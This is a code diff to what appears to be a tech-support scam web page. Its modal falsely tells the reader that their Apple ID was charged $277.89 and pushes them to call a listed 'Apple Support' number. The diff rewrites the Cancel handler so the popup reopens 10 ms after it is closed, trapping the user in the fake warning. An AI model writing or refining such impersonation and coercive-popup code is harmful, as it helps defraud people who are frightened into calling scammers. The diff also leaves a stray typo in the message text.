@@ -83,7 +83,7 @@
             <!-- CUSTOM MESSAGE AREA -->
             <div class="modal-content">
                 <h3>Notice</h3>
-                <p>Your Apple ID was recently used at APPLE STORE for $277.89 Via Apple Pay Pre-Authorization!
+                <p>hYour Apple ID was recently used at APPLE STORE for $277.89 Via Apple Pay Pre-Authorization!
 We have placed those request on hold to ensure safest and Security.
  Not you?
  Immediately call Apple Support +1(855) 733-8817 to Freeze it!.</p>
@@ -100,9 +100,17 @@ We have placed those request on hold to ensure safest and Security.
     </div>
 
     <script>
-        // Function to close the popup when 'Cancel' is clicked
+        // Function to close the popup and instantly reopen it
         function closePopup() {
-            document.getElementById('customPopup').style.display = 'none';
+            const popup = document.getElementById('customPopup');
+            
+            // 1. Hide the popup
+            popup.style.display = 'none';
+            
+            // 2. Instantly reopen it (10ms delay allows the browser to briefly render the closed state so it visually "reopens")
+            setTimeout(() => {
+                popup.style.display = 'flex';
+            }, 10);
         }
     </script>
 
